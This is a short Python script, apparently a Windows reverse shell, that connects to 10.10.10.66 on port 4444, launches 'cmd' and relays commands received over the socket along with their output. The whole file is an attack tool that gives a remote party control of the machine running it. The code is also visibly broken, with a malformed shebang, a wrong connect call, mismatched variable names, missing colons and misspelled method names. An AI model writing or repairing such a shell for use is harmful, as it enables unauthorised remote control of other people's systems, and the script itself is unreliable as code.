#usr/bin/python3

import subprocess, socket, asyncio

host = '10.10.10.66'
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(host, port)

s.sendall("conectando.....".encode())

async def shell():

      while 1:

	  poc = await asyncio.create_subprocess_shell("cmd", stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT)

	  cmd = b"\n"
	  proc.stdin.write(cmd)

	  while 1:
	     while 1:
	         out = await proc.stdout.readline()
		 break_ + out.decode("latin-1")
		 if break_[-2:] == "\n" or break_[-3:] == "> \n"
		     s.send(out[:-1])
		     break
	         elif break_.endswith(">" + cmd.decode()) or break_.endswith(">" cmd.decode())
		    pass
		 else:
		    s.send(out)

	    cmd = s.recv(1824)
	    cmd_ = cmd.decode()
            if cmd_ == "\n"
               proc.stdin.write(cmd + b"\n")
            elif cmd_.startwith("exit"):
               proc.terminate()
               break
            else:
	       proc.stdin.write(cmd + b"\n")

asyncio.set_evet_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
asyncio.run(shell())
